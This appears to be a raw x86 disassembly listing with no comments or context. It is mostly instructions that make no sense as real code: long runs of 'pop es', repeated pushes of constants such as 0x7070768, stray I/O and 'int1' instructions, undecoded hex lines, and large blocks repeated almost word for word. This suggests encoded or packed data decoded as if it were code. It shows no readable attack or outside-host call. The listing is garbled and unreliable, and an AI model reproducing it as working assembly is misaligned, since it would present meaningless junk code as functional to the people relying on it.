pop es
sbb dl dl
arpl [ esi + 0x4d ] di
pop ebx
push 0xb3931e68
sbb al 0x93
pop esi
push 0x7070768
pop es
pop es
pop es
pop es
sbb dl [ edx ]
push ebx
imul ebp [ eax + 0x68 ] 0x7e
mov dl 0x46
push 0x6e14f168

pop es
sar [ esi - 0x80 ] 0x5e
push 0x7070768
pop es
pop es
pop es
pop es
push 0x6853597e
push 0x6fd21ef1
jle r-xdata
push ss
push eax
pop ebp
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
cmp ebp [ eax + 0x68 ]
pop es
pop es
pop es
jle r-xdata
int1
push ds
sbb [ ecx + 0x682ed57e ] 0x68
pop es
pop es
pop es
daa
push 0x7070768
mov dh 0xcb
mov bl 0x87
sbb dl bl
mov bl 0x87
jle r-xdata
out dx eax
or [ eax + 0x68 ] ebp
pop es
pop es
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x257ec4c7
inc esi
push 0x7070768
jg r-xdata
mov bl 0x7e
cld
imul ebp [ eax + 0x68 ] 0xffffff98
adc ebx esp
ja r-xdata
push ds
xchg ebx eax
mov bl 0x1c
xchg ebx eax
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb ch dl
das
jle r-xdata
sub al 0x68
adc edx [ esi + 0x1a686820 ]
rcl [ ecx + 0x680be47e ] 0x68
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf175
cwde
jle r-xdata
push 0xb7e81468
xchg esi eax
push 0x17016807
xchg edi eax
push 0x827e57a4
jo r-xdata
push 0x7f070707
xor ch [ eax + ebp * 2 ]
push 0x99831ef1
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
push 0xd7ee3c0
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
cwde
adc esi esi
jle r-xdata
jle r-xdata
xchg edi eax
xchg edi eax
push ds
shl [ ebx + 0x7dc07e87 ] cl
push 0xd21c0768
outsd
jle r-xdata
and ch [ eax + 0x68 ]
pop es
adc dl [ edi + 0x7e ]
sbb [ edi - 0xef86869 ] bl
push ds
sar [ ebp - 0x31 ] cl
pop es
push 0x97972f01
xchg edi eax
adc dl [ edi - 0x68 ]
push 0x7070768
pop es
pop es
pop es
les edi [ esi + 0x40 ]
inc esp
push 0x7f070768
outsd
push 0x83b3eb14
xchg esi eax
cwde
adc eax ecx
jle r-xdata
lds edi [ esi + 0xd ]
push 0x7070707
jle r-xdata
pop ds
arpl [ eax + 0x68 ] bp
jg r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x50
jg r-xdata
jg r-xdata
jle r-xdata
push 0x96b7e814
push 0x8885daff
push eax
push 0x631f7e68
push 0x97eb7f68
std
xchg esi eax
xchg edi eax
xchg edi eax
pop es
cwde
adc bl [ edi + 0x1 ]
push 0x542f7e68
push 0xf1691c68
push ds
0xf16c1c29 0xea1e
jle r-xdata
xchg edi eax
xchg edi eax
into
jle r-xdata
xchg edi eax
0x7e21
pop ebp
push 0x85daff68
mov ch al
jle r-xdata
dec eax
push 0x29070768
mov ebx 0x7e979795
push esi
inc esp
push 0xfafd0768
enter 0x1ef1 0xea
jge r-xdata
jl r-xdata
pop eax
push 0x7070768
pop es
0x7efffd7d 0x3b8
out dx eax
sbb al 0x5f
jle r-xdata
enter 0x979c 0x97
pop es
pop es
pop es
pop es
int1
push ds
0x3edf7e21 0x6868
pushfd
xchg edi eax
xchg edi eax
push edi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
jle r-xdata
jl r-xdata
mov esp 0x797979e
pop es
scasb [ edi ]
jmp r-xdata
dec esi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jle r-xdata
int1
lodsb [ esi ]
pop eax
cwde
adc esp [ ecx + 0x4 ]
push 0xe3d92868
xchg edi eax
xchg edi eax
jle r-xdata
fwait
fisub [ edx + 0x68 ]
push 0x9a3e7f07
xchg edi eax
xchg edi eax
adc dl [ edi - 0x68 ]
adc bl [ edx + 0x7f979797 ]
sbb [ ecx + 0x68 ] ah
push 0x13985712
cmp eax 0x7e68687a
retn
push 0x7e070707
push 0x79
push 0xd21c0768
imul edi [ esi - 0x64 ] 0xffffff92
xchg edi eax
xchg edi eax
les edi [ esi + 0x44 ]
cmp al 0x68
sub ebp [ cs : eax + 0x68 ]
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
outsd
pushad
push 0xdbc06868
adc dl [ edi - 0x68 ]
adc esi [ edx + 0x5c ]
push 0xceb5fd68
std
mov dl 0x7e
xchg esi eax
pop esp
push 0xca1ef168
and [ esi + 0x1b ] edi
push 0x7070768
pop es
pop es
push 0x7a7edfc1
jpe r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97976f00
xchg edi eax
adc dl [ edi + 0x7e ]
cmp cl [ eax + ebp * 2 + 0x68 ]
push 0x60979797
outsb
rol ch 0x68
jecxz r-xdata
insd
push 0x7070768
xchg ebx eax
xchg esi eax
xchg edi eax
xchg edi eax
push 0x97972f01
xchg edi eax
jle r-xdata
add al 0x68
push 0x7070707
pop es
pop es
pop es
pop es
jle r-xdata
push 0x25ba7ecd
push 0x7070768
pop es
pop es
pop es
sbb al 0xd2
lahf
jg r-xdata
add eax 0x5ece6868
push esp
pop es
jle r-xdata
push 0x7e8fb3e3
push ds
xor al 0x68
push 0xa3d11e07
push [ 0x7e7cf631 ]
push 0xf1cd0707
push ds
retn 0x1caf
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
jle r-xdata
push 0x7070707
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al [ edx ]
insb
push 0x57847f68
push 0x51807e68
push 0x5ecc0768
push esp
pop es
salc
sbb eax 0x32c27e86
push 0xc7070768
push 0x97977b00
xchg edi eax
jle r-xdata
xchg edi eax
pop es
pop es
pop es
xchg esi eax
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
jg r-xdata
daa
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x7b1c
sub ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push edi
jle r-xdata
xchg edi eax
das
push 0x60977e68
push 0x7e7e0768
xchg ebx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
enter 0xb17e 0x3b
push 0x399e7f68
push 0x69577e68
push 0x7070768
xchg esp eax
ficomp [ edi - 0x6b9028e4 ]
shr [ ebx + 0x7e ] cl
leave
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp ebp
dec edx
push 0x9b667e68
inc esi
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x6f
push 0x7e560298
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
std
out dx eax
int1
push ds
shl [ ecx + 0x7e ] cl
add al 0x2a
push 0x7070768
pop es
pop es
adc cl [ eax + ebx * 4 + 0x13 ]
fild [ ebx ]
push 0x6be26868
sar [ esi + 0x17 ] 0x32
push 0x7070768
pop es
pop es
pop es
std
lahf
xchg edi eax
xchg edi eax
jle r-xdata
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x9787c87e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
0x7f6b
push esp
push 0x7070768
pop es
sub_491781
dec ecx
push 0xd47ec168
xor [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
sbb dl dl
arpl [ esi + 0x4d ] di
pop ebx
push 0xb3931e68
sbb al 0x93
pop es
sar [ esi - 0x80 ] 0x5e
push 0x7070768
pop es
pop es
pop es
pop es
push 0x6853597e
push 0x6fd21ef1
jle r-xdata
push ss
push eax
pop ebp
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
cmp ebp [ eax + 0x68 ]
pop es
pop es
pop es
jle r-xdata
int1
push ds
sbb [ ecx + 0x682ed57e ] 0x68
pop es
pop es
pop es
daa
push 0x7070768
mov dh 0xcb
mov bl 0x87
sbb dl bl
mov bl 0x87
jle r-xdata
out dx eax
or [ eax + 0x68 ] ebp
pop es
pop es
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x257ec4c7
inc esi
push 0x7070768
jg r-xdata
mov bl 0x7e
cld
imul ebp [ eax + 0x68 ] 0xffffff98
adc ebx esp
ja r-xdata
push ds
xchg ebx eax
mov bl 0x1c
xchg ebx eax
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb ch dl
das
jle r-xdata
sub al 0x68
adc edx [ esi + 0x1a686820 ]
rcl [ ecx + 0x680be47e ] 0x68
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf175
cwde
jle r-xdata
push 0xb7e81468
xchg esi eax
push 0x17016807
xchg edi eax
push 0x827e57a4
jo r-xdata
push 0x7f070707
xor ch [ eax + ebp * 2 ]
push 0x99831ef1
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
push 0xd7ee3c0
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
cwde
adc esi esi
jle r-xdata
jle r-xdata
xchg edi eax
xchg edi eax
push ds
shl [ ebx + 0x7dc07e87 ] cl
push 0xd21c0768
outsd
jle r-xdata
and ch [ eax + 0x68 ]
pop es
adc dl [ edi + 0x7e ]
sbb [ edi - 0xef86869 ] bl
push ds
sar [ ebp - 0x31 ] cl
pop es
push 0x97972f01
xchg edi eax
adc dl [ edi - 0x68 ]
push 0x7070768
pop es
pop es
pop es
les edi [ esi + 0x40 ]
inc esp
push 0x7f070768
outsd
push 0x83b3eb14
xchg esi eax
cwde
adc eax ecx
jle r-xdata
lds edi [ esi + 0xd ]
push 0x7070707
jle r-xdata
pop ds
arpl [ eax + 0x68 ] bp
jg r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x50
jg r-xdata
jg r-xdata
jle r-xdata
push 0x96b7e814
push 0x8885daff
push eax
push 0x631f7e68
push 0x97eb7f68
std
xchg esi eax
xchg edi eax
xchg edi eax
pop es
cwde
adc bl [ edi + 0x1 ]
push 0x542f7e68
push 0xf1691c68
push ds
0xf16c1c29 0xea1e
jle r-xdata
xchg edi eax
xchg edi eax
into
jle r-xdata
xchg edi eax
0x7e21
pop ebp
push 0x85daff68
mov ch al
jle r-xdata
dec eax
push 0x29070768
mov ebx 0x7e979795
push esi
inc esp
push 0xfafd0768
enter 0x1ef1 0xea
jge r-xdata
jl r-xdata
pop eax
push 0x7070768
pop es
0x7efffd7d 0x3b8
out dx eax
sbb al 0x5f
jle r-xdata
enter 0x979c 0x97
pop es
pop es
pop es
pop es
int1
push ds
0x3edf7e21 0x6868
pushfd
xchg edi eax
xchg edi eax
push edi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
jle r-xdata
jl r-xdata
mov esp 0x797979e
pop es
scasb [ edi ]
jmp r-xdata
dec esi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jle r-xdata
int1
lodsb [ esi ]
pop eax
cwde
adc esp [ ecx + 0x4 ]
push 0xe3d92868
xchg edi eax
xchg edi eax
jle r-xdata
fwait
fisub [ edx + 0x68 ]
push 0x9a3e7f07
xchg edi eax
xchg edi eax
adc dl [ edi - 0x68 ]
adc bl [ edx + 0x7f979797 ]
sbb [ ecx + 0x68 ] ah
push 0x13985712
cmp eax 0x7e68687a
retn
push 0x7e070707
push 0x79
push 0xd21c0768
imul edi [ esi - 0x64 ] 0xffffff92
xchg edi eax
xchg edi eax
les edi [ esi + 0x44 ]
cmp al 0x68
sub ebp [ cs : eax + 0x68 ]
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
outsd
pushad
push 0xdbc06868
adc dl [ edi - 0x68 ]
adc esi [ edx + 0x5c ]
push 0xceb5fd68
std
mov dl 0x7e
xchg esi eax
pop esp
push 0xca1ef168
and [ esi + 0x1b ] edi
push 0x7070768
pop es
pop es
push 0x7a7edfc1
jpe r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97976f00
xchg edi eax
adc dl [ edi + 0x7e ]
cmp cl [ eax + ebp * 2 + 0x68 ]
push 0x60979797
outsb
rol ch 0x68
jecxz r-xdata
insd
push 0x7070768
xchg ebx eax
xchg esi eax
xchg edi eax
xchg edi eax
push 0x97972f01
xchg edi eax
jle r-xdata
add al 0x68
push 0x7070707
pop es
pop es
pop es
pop es
jle r-xdata
push 0x25ba7ecd
push 0x7070768
pop es
pop es
pop es
sbb al 0xd2
lahf
jg r-xdata
add eax 0x5ece6868
push esp
pop es
jle r-xdata
push 0x7e8fb3e3
push ds
xor al 0x68
push 0xa3d11e07
push [ 0x7e7cf631 ]
push 0xf1cd0707
push ds
retn 0x1caf
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
jle r-xdata
push 0x7070707
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al [ edx ]
insb
push 0x57847f68
push 0x51807e68
push 0x5ecc0768
push esp
pop es
salc
sbb eax 0x32c27e86
push 0xc7070768
push 0x97977b00
xchg edi eax
jle r-xdata
xchg edi eax
pop es
pop es
pop es
xchg esi eax
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
jg r-xdata
daa
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x7b1c
sub ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push edi
jle r-xdata
xchg edi eax
das
push 0x60977e68
push 0x7e7e0768
xchg ebx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
enter 0xb17e 0x3b
push 0x399e7f68
push 0x69577e68
push 0x7070768
xchg esp eax
ficomp [ edi - 0x6b9028e4 ]
shr [ ebx + 0x7e ] cl
leave
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp ebp
dec edx
push 0x9b667e68
inc esi
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x6f
push 0x7e560298
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
std
out dx eax
int1
push ds
shl [ ecx + 0x7e ] cl
add al 0x2a
push 0x7070768
pop es
pop es
adc cl [ eax + ebx * 4 + 0x13 ]
fild [ ebx ]
push 0x6be26868
sar [ esi + 0x17 ] 0x32
push 0x7070768
pop es
pop es
pop es
std
lahf
xchg edi eax
xchg edi eax
jle r-xdata
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x9787c87e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
0x7f6b
push esp
push 0x7070768
pop es
sub_491878
int1
push ds
sar [ ebx - 0x31 ] cl
std
int1
push ds
sar [ ecx - 0x31 ] cl
jle r-xdata
cmp [ eax + 0x68 ] ebp
pop es
jle r-xdata
cwde
adc eax ecx
jle r-xdata
jle r-xdata
jg r-xdata
push 0x96b7e814
jle r-xdata
push 0x7070707
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
push 0xd7ee3c0
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
0x7e21
pop ebp
push 0x85daff68
mov ch al
jle r-xdata
cwde
adc esi esi
jle r-xdata
xor al 0x68
push 0x7f070707
leave
xchg ecx eax
xchg edi eax
xchg edi eax
adc al 0x53
fwait
adc dl [ edi + 0x7e ]
loopne r-xdata
pop es
push 0x83b3eb14
xchg esi eax
pop ds
arpl [ eax + 0x68 ] bp
jg r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x50
jg r-xdata
lds edi [ esi + 0xd ]
push 0x7070707
jle r-xdata
jge r-xdata
pop es
pop es
les edi [ esi + 0x40 ]
inc esp
push 0x7f070768
outsd
push 0x7070768
jle r-xdata
xchg edi eax
push 0x8885daff
xchg edi eax
xchg edi eax
into
jle r-xdata
push eax
push 0x631f7e68
push 0x97eb7f68
std
xchg esi eax
xchg edi eax
xchg edi eax
pop es
cwde
adc bl [ edi + 0x1 ]
push 0x542f7e68
push 0xf1691c68
push ds
0xf16c1c29 0xea1e
0x7efffd7d 0x3b8
jle r-xdata
dec eax
push 0x29070768
mov ebx 0x7e979795
push esi
inc esp
push 0xfafd0768
enter 0x1ef1 0xea
jl r-xdata
pop eax
push 0x7070768
pop es
out dx eax
sbb al 0x5f
jle r-xdata
enter 0x979c 0x97
pop es
pop es
pop es
pop es
int1
push ds
0x3edf7e21 0x6868
pushfd
xchg edi eax
xchg edi eax
push edi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
jle r-xdata
jl r-xdata
mov esp 0x797979e
pop es
scasb [ edi ]
jmp r-xdata
dec esi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jle r-xdata
int1
lodsb [ esi ]
pop eax
cwde
adc esp [ ecx + 0x4 ]
push 0xe3d92868
xchg edi eax
xchg edi eax
jle r-xdata
fwait
fisub [ edx + 0x68 ]
push 0x9a3e7f07
xchg edi eax
xchg edi eax
adc dl [ edi - 0x68 ]
adc bl [ edx + 0x7f979797 ]
sbb [ ecx + 0x68 ] ah
push 0x13985712
cmp eax 0x7e68687a
retn
push 0x7e070707
push 0x79
push 0xd21c0768
imul edi [ esi - 0x64 ] 0xffffff92
xchg edi eax
xchg edi eax
les edi [ esi + 0x44 ]
cmp al 0x68
sub ebp [ cs : eax + 0x68 ]
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
outsd
pushad
push 0xdbc06868
adc dl [ edi - 0x68 ]
adc esi [ edx + 0x5c ]
push 0xceb5fd68
std
mov dl 0x7e
xchg esi eax
pop esp
push 0xca1ef168
and [ esi + 0x1b ] edi
push 0x7070768
pop es
pop es
push 0x7a7edfc1
jpe r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97976f00
xchg edi eax
adc dl [ edi + 0x7e ]
cmp cl [ eax + ebp * 2 + 0x68 ]
push 0x60979797
outsb
rol ch 0x68
jecxz r-xdata
insd
push 0x7070768
xchg ebx eax
xchg esi eax
xchg edi eax
xchg edi eax
push 0x97972f01
xchg edi eax
jle r-xdata
add al 0x68
push 0x7070707
pop es
pop es
pop es
pop es
jle r-xdata
push 0x25ba7ecd
push 0x7070768
pop es
pop es
pop es
sbb al 0xd2
lahf
jg r-xdata
add eax 0x5ece6868
push esp
pop es
jle r-xdata
push 0x7e8fb3e3
push ds
xor al 0x68
push 0xa3d11e07
push [ 0x7e7cf631 ]
push 0xf1cd0707
push ds
retn 0x1caf
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
jle r-xdata
push 0x7070707
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al [ edx ]
insb
push 0x57847f68
push 0x51807e68
push 0x5ecc0768
push esp
pop es
salc
sbb eax 0x32c27e86
push 0xc7070768
push 0x97977b00
xchg edi eax
jle r-xdata
xchg edi eax
pop es
pop es
pop es
xchg esi eax
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
jg r-xdata
daa
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x7b1c
sub ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push edi
jle r-xdata
xchg edi eax
das
push 0x60977e68
push 0x7e7e0768
xchg ebx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
enter 0xb17e 0x3b
push 0x399e7f68
push 0x69577e68
push 0x7070768
xchg esp eax
ficomp [ edi - 0x6b9028e4 ]
shr [ ebx + 0x7e ] cl
leave
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp ebp
dec edx
push 0x9b667e68
inc esi
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x6f
push 0x7e560298
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
std
out dx eax
int1
push ds
shl [ ecx + 0x7e ] cl
add al 0x2a
push 0x7070768
pop es
pop es
adc cl [ eax + ebx * 4 + 0x13 ]
fild [ ebx ]
push 0x6be26868
sar [ esi + 0x17 ] 0x32
push 0x7070768
pop es
pop es
pop es
std
lahf
xchg edi eax
xchg edi eax
jle r-xdata
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x9787c87e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
0x7f6b
push esp
push 0x7070768
pop es
sub_4919ac
imul edi [ esi - 0x44 ] 0x797979e
pop es
scasb [ edi ]
jmp r-xdata
sub ebp [ cs : eax + 0x68 ]
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
outsd
pushad
push 0xdbc06868
adc dl [ edi - 0x68 ]
adc esi [ edx + 0x5c ]
push 0xceb5fd68
std
mov dl 0x7e
xchg esi eax
pop esp
push 0xca1ef168
and [ esi + 0x1b ] edi
push 0x7070768
pop es
pop es
push 0x7a7edfc1
jpe r-xdata
push 0x7e8fb3e3
push ds
xor al 0x68
push 0xa3d11e07
push [ 0x7e7cf631 ]
enter 0x979c 0x97
pop es
pop es
pop es
pop es
int1
push ds
0x3edf7e21 0x6868
push 0xf1cd0707
push ds
retn 0x1caf
sub_491c9c
push es
push edi
jle r-xdata
jg r-xdata
pop es
push 0x7070707
jg r-xdata
jle r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
lodsb [ esi ]
pop esp
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
pop es
push ds
adc [ edi ] ecx
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
outsd
push 0x68070768
shl [ edi + 0x6a5f121a ] 0x68
push 0x7070768
std
nop
jle r-xdata
or ebp [ eax + 0x68 ]
push 0x271e7ea1
push 0x98070768
adc edx [ ebx ]
push 0xb3eb1468
mov bl 0x97
cwde
adc ebp esi
imul eax eax 0x7e
pop ss
xor ch [ eax + 0x68 ]
pop es
pop es
pop es
push es
sub [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
pop es
std
push ds
shl [ ecx + 0x7e ] cl
add al 0x2a
push 0x7070768
pop es
pop es
adc cl [ eax + ebx * 4 + 0x13 ]
fild [ ebx ]
push 0x6be26868
sar [ esi + 0x17 ] 0x32
push 0x7070768
xchg edx eax
xchg edi eax
xchg edi eax
int1
push ds
fidiv [ edi - 0x32 ]
jle r-xdata
push 0x7e571207
out dx eax
sub eax 0x7076868
xlat
jle r-xdata
jbe r-xdata
pop es
jle r-xdata
sub al 0x68
push 0x6cc7ec7
push 0x7070768
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xfd37
xchg edi eax
pop es
int1
adc al 0xa9
add [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
jle r-xdata
jle r-xdata
push 0x37c31398
push 0x93fdc468
sbb dl dl
dec ebx
push 0x7070768
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push 0xbbc168c7
jle r-xdata
and al 0x68
push 0x7070707
cwde
adc dh [ esi + 0x7e68684a ]
sub ch [ edi + 0x68 ]
push 0xc1680707
cmpsd [ esi ] [ edi ]
sbb dl [ edx ]
pop edi
push 0x68
push 0x60bb7ec8
dec edi
push 0x657e0768
jl r-xdata
push 0x4e567e68
push 0xc1070768
jle r-xdata
out dx al
sahf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sar [ esi + 0x2a ] 0x41
push 0x1c070768
inc edi
sbb al 0x4f
int1
push ds
0x7e87
push 0x871ef168
jle r-xdata
insd
push 0xbb7ec868
pushad
xchg edi eax
jle r-xdata
sub [ eax + 0x68 ] ch
pop es
pop es
sbb al 0x6f
movsb [ edi ] [ esi ]
dec esp
jle r-xdata
push 0x7e571268
inc ebx
cmp al 0x68
push 0x7070707
pop es
pop es
pop es
pop es
pop es
iretd
push 0x7070707
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x1ccd
fwait
xchg edi eax
sub_491e68
xor [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
push [ esi - 0x6b ]
push eax
jle r-xdata
jle r-xdata
jb r-xdata
cmp ebp [ eax + 0x68 ]
[ edi + 0x7eb41eff ]
das
push 0x111ec068
add edx [ edi - 0x4a806869 ]
push edx
push 0x42f7e68
push 0xc4070768
sar [ edi - 0x5e ] 0x50
push 0x72797e68
push 0x7070768
pop es
pop es
pop es
pop es
sbb dl [ edx ]
inc ebx
push 0x68
push 0x4d887ec4
push 0x7070768
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
pop es
cwde
adc ecx esp
push eax
push 0x577a7e68
push 0x7070768
pop es
pop es
int1
push ds
retn 0x7ec9
pop es
pop es
arpl [ eax + 0x68 ] bp
adc al 0x57
xchg ebp eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
or ebp [ eax + 0x68 ]
pop es
pop es
pop es
cwde
adc ebp esp
and [ eax + 0x68 ] ch
jle r-xdata
pop es
pop es
pop es
push eax
shl [ ebx - 0x1e ] cl
in al 0xf2
in eax 0xf1
push eax
shr [ edi - 0x5c ] cl
movsd [ edi ] [ esi ]
jle r-xdata
pop edi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jle r-xdata
retn
push 0xb87e6868
cmp ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
pop edi
push 0x68
push 0x682fd27e
push 0x6859017e
push 0x7070707
add al 0x68
pop es
pop es
jle r-xdata
shr [ edi ] cl
push 0x59017e68
push 0x7070768
pop es
push esp
push 0x7070768
push ebx
push 0x23111e68
xchg edi eax
mov eax 0xc068682e
push ds
rol ebx 0x1
jg r-xdata
dec edx
push 0xd21e0768
outsd
push ds
shl [ ebx + 0x1e ] cl
shr [ ebx + 0x7e ] cl
lea esi [ eax + ebp * 2 ]
push 0x1c070707
ficomp [ ebx + 0x682eb87e ]
push 0xc3d11ec0
sbb [ edx + 0x68 ] ecx
push 0x6fd21e07
push ebx
push 0x96d97e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
xchg esp eax
ficomp [ ebx - 0x39 ]
jle r-xdata
push 0xae070707
add [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
pop es
jg r-xdata
push 0x7070707
pop es
pop es
rcr [ esi ] 0x11
daa
xchg edi eax
xchg edi eax
push ebx
push 0x26fe7e68
push 0x7070768
pop es
pop es
jle r-xdata
xchg edi eax
jg r-xdata
inc esp
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc al 0x6e
movsd [ edi ] [ esi ]
cwde
adc bl [ ecx ]
insb
push 0x9fdf1c68
jle r-xdata
xchg edi eax
xchg edi eax
jle r-xdata
push 0x9723111e
0x712986f 0x6834
outsb
push 0x7070768
scasb [ edi ]
sub_492022
push 0x1b7e57a4
inc ecx
jle r-xdata
push 0x687eb7c0
lahf
xchg edi eax
xchg edi eax
sar [ esi - 0x2a ] 0xc
push 0xf1070768
push ds
retn 0x7f33
xor al 0x68
push 0x68a3e168
loop r-xdata
aas
push 0x457f7e68
push 0x7ec80768
xor al 0x68
push 0x87b3d31c
xchg esi eax
shl [ ebx - 0x4c2c9771 ] cl
mov ebx [ ebx + edx * 8 ]
mov bl 0x8b
jle r-xdata
mov bl 0x87
push 0x7e93fd68
mul [ ecx ]
push 0xc21ef168
int1
sbb al 0x47
movsb [ edi ] [ esi ]
push edi
jle r-xdata
pop es
push 0xea1ef168
and eax 0x6807987e
push 0x7070707
pop es
pop es
pop es
pop es
jle r-xdata
pop es
enter 0x667e 0x34
push 0xb3d31c68
xchg [ esi + 0x688fb3d3 ] edx
shl [ ebx - 0x4c2ce375 ] cl
mov edi [ esi - 0x10 ]
and al 0x68
push 0x685c777e
push 0x7070707
pop es
pop es
cwde
adc al [ ecx + 0x7e686848 ]
xchg ebx eax
dec eax
push 0x68070768
add [ edi ] ebp
xchg edi eax
xchg edi eax
xchg edi eax
adc dl [ edi + 0x7e ]
and cl [ esi + 0x68 ]
push 0x757ece07
push ebp
push 0x7070768
pop es
dec [ ebx + 0x7e1e2b45 ]
lahf
jb r-xdata
outsd
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int3
jbe r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
ror [ edi + 0x7e ] cl
int1
push es
push 0x7070768
call [ edi + 0x7e9f9797 ]
insd
or ch [ eax + 0x68 ]
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
push 0x7070707
pop es
pop es
pop es
jle r-xdata
retn 0xcd57
pop ebx
push 0x501c0768
int1
push ds
shl [ edi - 0x31 ] cl
std
out dx eax
sbb al 0x67
jle r-xdata
sub al 0x4b
push 0x7070768
pop es
pop es
pop es
int1
push ds
0x7e6f
push 0x7076868
pop es
xchg edi eax
jle r-xdata
jno r-xdata
xchg ebx eax
jle r-xdata
dec ebx
push 0xf1070768
push ds
pop es
pop es
push 0x43d21e07
push 0xed7ec3c0
sub ebp [ eax + 0x68 ]
int1
push ds
rol [ ebp + 0x6803537e ] cl
push 0xa3d11c07
push 0xd21e6fe2
inc edi
jle r-xdata
pop eax
push 0x7070768
